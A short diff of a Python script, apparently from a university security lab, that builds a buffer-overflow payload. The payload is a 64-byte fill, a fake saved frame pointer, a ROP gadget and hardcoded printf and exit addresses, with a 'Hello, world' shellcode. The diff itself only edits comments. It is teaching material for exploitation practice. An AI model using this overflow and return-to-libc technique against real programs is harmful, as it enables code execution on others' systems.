@@ -1,4 +1,4 @@
-#edited by shaun yee 1001531 15/3/2018 for Security Lab. 
+#edited by shaun yee 1001531 15/3/2018 for Security Lab 5. 
 
 #!/usr/bin/env python3
 # Simple Python script to generate shellcode for Lab5
@@ -6,13 +6,13 @@
 
 
 from struct import pack
-lenfill = 64 # or some other value
+lenfill = 64 
 
 # Hello World! payload - designed by Oka, 2014
 payload = b'\xeb\x2a\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\xe8\xd1\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21'
 
 # Set up return address. pwnlib is used to turn int to string
-
+#this is not used for payload2. 
 storedRBP = pack('<Q',0x4444444444444444) # DDDDDDDD in hex
 
 # gadget address
@@ -30,8 +30,9 @@ stringAD_shell = pack('<Q',0x7fffffffe608)
 #printf Address that was found using p printf
 printf = pack('<Q', 0x7ffff7a62800)
 
-#exit address
+#exit address, found by using p exit
 exit = pack('<Q', 0x7ffff7a47030)
+
 with open('payloadgdb2','wb') as f:
     f.write(b'A' * lenfill+b'dddddddd'+gadget+stringAD_gdb+printf+exit+b'hello world'+b'\n')
 
